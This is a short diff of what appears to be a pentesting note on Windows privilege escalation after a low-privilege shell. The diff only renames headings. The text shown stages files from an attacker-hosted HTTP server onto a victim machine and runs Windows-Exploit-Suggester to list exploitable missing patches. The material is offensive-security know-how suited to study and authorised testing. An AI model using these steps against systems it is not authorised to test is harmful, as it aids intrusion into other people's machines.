@@ -1,6 +1,6 @@
 This post contents is about when you get a low, unprivileged shell on a Windows Machine.
 First and foremost thing is to upload files on the system.
-### 1
+### Steps:
     Start server on attacker machine:
     >python3 -m http.server 80 #on attacker machine
     On victim machine:
@@ -8,7 +8,7 @@ First and foremost thing is to upload files on the system.
 
 Easy way to check for privilege escalation vulnerabilties is to use [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) 
 Steps to use Windows-Exploit-Suggester
-### 2
+### Steps:
     On attacker machine:
     Install xlrd python library.
     >python windows-exploit-suggester.py -update #this will create a .xls file which will contain all ms cve's   
